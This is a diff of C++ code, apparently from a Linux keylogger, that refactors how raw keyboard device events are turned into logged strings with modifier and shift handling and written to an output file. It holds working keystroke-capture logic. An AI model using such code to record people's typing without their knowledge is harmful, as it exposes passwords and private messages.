@@ -96,6 +96,30 @@ std::string getModifierName(__u16 keycode) {
         return "[UNKOWN MODIFIER]";
 }
 
+// If only shift is pressed
+bool onlyShiftModifier(std::vector<__u16> activeModifiers){
+    return activeModifiers.size() == 1 && (activeModifiers[0]
+        == KEY_LEFTSHIFT || activeModifiers[0] == KEY_RIGHTSHIFT); 
+}
+
+// Get the string to log for a key
+std::string getKeyString(__u16 keycode, const std::vector<__u16>&
+        activeModifiers){
+    std::string result = "";
+    if(onlyShiftModifier(activeModifiers)){
+       result += shiftKeyMap[keycode]; 
+    }
+    else{
+        for(size_t i=0; i<activeModifiers.size(); i++){
+            result += getModifierName(activeModifiers[i]);
+            result += "+";
+        }
+        result += keyMap[keycode];
+    }
+
+    return result;
+}
+
 void captureEvents(std::string &kbd_device){
 
     // Opening keyboard file in Read Mode
@@ -117,26 +141,21 @@ void captureEvents(std::string &kbd_device){
 
     // input_event object to make a buffer to store key inputs
     struct input_event inputs;
-    
-    // bool to hold if we are holding key 
-    bool keyhold = false;
-
-    // To store mulitple modifiers (eg in shortcuts)
     std::vector<__u16> activeModifiers;
     std::vector<__u16> pressedKeys; // Track all pressed keys
 
     while(1){
-        
+
         // Reading from input_fd in inputs struct
         read(input_fd, &inputs, sizeof(inputs));
-        
+
         // If input is not of a key type than ignore that 
         if(inputs.type != EV_KEY) continue;         
 
         // Key is released
         if(inputs.value == 0){
-            auto keyIt = std::find(pressedKeys.begin(), pressedKeys.end(),
-                    inputs.code);
+            auto keyIt = std::find(pressedKeys.begin(),
+                    pressedKeys.end(), inputs.code);
             if(keyIt != pressedKeys.end()) {
                 pressedKeys.erase(keyIt);
             }
@@ -157,23 +176,18 @@ void captureEvents(std::string &kbd_device){
                 activeModifiers.push_back(inputs.code);
             }
             else {
-                std::string result = "";
-                for(size_t i = 0; i < activeModifiers.size(); i++) {
-                    result += getModifierName(activeModifiers[i]);
-                    result += "+";
-                }
-
-                result += keyMap[inputs.code];
-                result += "\n";
-
+                std::string result = getKeyString(inputs.code,
+                        activeModifiers) + "\n";
+ 
                 write(output_fd, result.c_str(), result.size());
             }
         }
         
         // Key is hold
-        if(inputs.value == 2){
-            if(!isModifier(inputs.code) && activeModifiers.empty()) {
-                std::string result = keyMap[inputs.code] + " (repeat)\n";
+        if(inputs.value == 2 && !isModifier(inputs.code)){
+            if(activeModifiers.empty() || onlyShiftModifier(activeModifiers)) {
+                std::string result = getKeyString(inputs.code, 
+                        activeModifiers) + " (repeat)\n";
                 write(output_fd, result.c_str(), result.size());
             }    
         }
